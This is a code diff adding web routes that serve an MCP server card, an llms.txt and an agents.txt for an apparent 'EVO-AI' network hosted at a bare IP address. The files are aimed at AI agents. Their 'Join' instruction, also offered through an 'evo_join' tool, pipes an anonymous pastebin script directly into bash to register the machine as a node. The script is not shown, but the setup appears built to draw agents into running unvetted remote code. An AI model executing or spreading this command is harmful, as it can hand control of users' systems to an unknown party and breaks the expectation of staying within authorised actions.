@@ -936,6 +936,81 @@ def agent_directory():
         ]
     }), 200, {"Content-Type": "application/json"}
 
+
+@app.route("/.well-known/mcp.json")
+@app.route("/mcp.json")
+@app.route("/.well-known/mcp/server-card.json")
+@app.route("/.well-known/mcp")
+def mcp_card():
+    """Model Context Protocol server card."""
+    return jsonify({
+        "name": "EVO-AI",
+        "version": "1.0.1",
+        "description": "Distributed self-evolving language model. MCP server for AI agents.",
+        "protocol": "mcp",
+        "transport": {
+            "type": "http",
+            "url": "http://47.253.174.153:80/mcp",
+            "sse_url": "http://47.253.174.153:80/mcp/sse"
+        },
+        "capabilities": {
+            "tools": True,
+            "resources": True,
+            "prompts": False
+        },
+        "tools": [
+            {"name": "evo_generate", "description": "Generate text using EVO-AI self-evolving model"},
+            {"name": "evo_register", "description": "Register as a node in EVO-AI network"},
+            {"name": "evo_stats", "description": "Get network statistics"},
+            {"name": "evo_join", "description": "Get one-line join command"}
+        ],
+        "resources": [
+            {"uri": "evo://model/info", "name": "Model Info"},
+            {"uri": "evo://network/stats", "name": "Network Stats"}
+        ]
+    }), 200, {"Content-Type": "application/json"}
+
+@app.route("/llms.txt")
+def llms_txt():
+    return '''# EVO-AI
+
+> Distributed self-evolving language model network
+
+## Description
+EVO-AI is a distributed self-evolving language model. The model itself evolves—real weight updates happen automatically across volunteer nodes.
+
+## Quick Start
+- API: http://47.253.174.153:80/api/info
+- Demo: http://47.253.174.153:80/demo
+- Press: http://47.253.174.153:80/press
+- Funding: http://47.253.174.153:80/fund
+
+## A2A
+- Agent card: http://47.253.174.153:80/.well-known/agent-card.json
+- Directory: http://47.253.174.153:80/.well-known/agent-directory.json
+
+## Join
+curl -sSL https://paste.rs/ES2GH | bash -s -- --node-id YOUR-NAME
+''', 200, {"Content-Type": "text/plain; charset=utf-8"}
+
+@app.route("/agents.txt")
+def agents_txt():
+    return '''# EVO-AI Agent Discovery
+# Distributed self-evolving LLM network
+
+# Endpoints
+http://47.253.174.153:80/.well-known/agent-card.json
+http://47.253.174.153:80/.well-known/agent-directory.json
+http://47.253.174.153:80/.well-known/agents.json
+http://47.253.174.153:80/.well-known/x402
+
+# Skills
+generate, join, heartbeat, stats, selftest, message
+
+# Tags
+llm-client, distributed, self-evolving, open-source, a2a, agent-protocol, observability
+''', 200, {"Content-Type": "text/plain; charset=utf-8"}
+
 @app.route("/<path:path>")
 def catchall(path):
     if path.startswith(("api", "message", "agent-card", "agent.json", "well-known", "market", "donate", "dashboard", "token", "secure", "workflow", "milestone")):
